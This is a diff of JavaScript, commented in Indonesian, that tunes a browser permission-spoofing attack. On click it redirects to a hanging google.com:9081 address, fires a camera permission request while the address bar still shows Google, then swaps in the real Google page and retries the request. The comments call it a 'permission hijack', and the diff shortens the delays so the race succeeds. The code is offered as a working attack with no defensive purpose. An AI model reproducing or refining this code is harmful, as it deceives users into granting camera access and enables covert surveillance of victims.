@@ -44,17 +44,16 @@
   // ============================================
   // KONFIGURASI
   // ============================================
-  var GOOGLE_DELAY = "http://google.com:9081"; // Port yang akan menggantung
+  var GOOGLE_DELAY = "http://google.com:9081"; // Port Delay
   var GOOGLE_REAL = "https://www.google.com"; // Google Asli
 
   // ============================================
-  // FUNGSI: PERMISSION REQUEST (IFRAME TRICK)
+  // FUNGSI: PERMISSION REQUEST (TOP-LEVEL)
   // ============================================
   function triggerCameraPermission() {
     try {
       log("[+] Meminta Izin Kamera...");
       
-      // Trik: Panggil getUserMedia langsung di top-level
       navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         .then(function(stream) {
           var video = document.getElementById('cam-feed');
@@ -69,7 +68,7 @@
   }
 
   // ============================================
-  // TRIGGER STACKING (KLIK)
+  // TRIGGER RACE STACKING (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
@@ -81,48 +80,45 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Google Spoofing Stack...");
+    log("[!] Memulai Delay Stacking Spoof...");
 
     // ============================================
-    // A. REDIRECT KE PORT 9081 (MEMBUAT LOADING)
+    // A. REDIRECT KE PORT 9081 (0ms)
     // ============================================
+    // Mulai transisi ke Google:9081 (akan hang).
     try {
-      log("[+] Redirect ke google.com:9081 (Loading)...");
-      // Jika ini berhasil, address bar akan menampilkan google.com:9081
+      log("[+] Redirect ke google.com:9081...");
       window.location.href = GOOGLE_DELAY;
     } catch(e) {}
 
     // ============================================
-    // B. PERMISSION HIJACK (0ms Setelah Redirect)
+    // B. PERMISSION HIJACK (10ms)
     // ============================================
-    // Kita memicu izin kamera TEPAT saat browser sedang loading Google:9081.
-    // Tujuannya agar prompt muncul saat address bar masih google.com:9081.
-    
+    // Tembak izin kamera saat browser sedang hang di 9081.
     setTimeout(function() {
       log("[+] Meminta Izin Kamera (Stacked)...");
       triggerCameraPermission();
     }, 10);
 
     // ============================================
-    // C. REDIRECT KE GOOGLE ASLI (500ms)
+    // C. REDIRECT KE GOOGLE ASLI (150ms)
     // ============================================
-    // Setelah prompt muncul, kita timpa redirect ke Google Asli.
-    // Tujuannya agar user mengira mereka di Google asli setelah memberikan izin.
-    
+    // Timpa dengan Google asli agar user melihat Google setelah prompt muncul.
     setTimeout(function() {
       log("[+] Menimpa dengan Google Asli...");
       try {
         window.location.href = GOOGLE_REAL;
       } catch(e) {}
-    }, 500);
+    }, 150);
 
     // ============================================
-    // D. RETRY PERMISSION (1000ms)
+    // D. RETRY PERMISSION (500ms)
     // ============================================
+    // Jika prompt gagal muncul di awal, coba lagi saat sudah di Google.
     setTimeout(function() {
-      log("[+] Retry Izin Kamera...");
+      log("[+] Retry Izin Kamera (di Google)...");
       triggerCameraPermission();
-    }, 1000);
+    }, 500);
 
   }, { once: true });
 
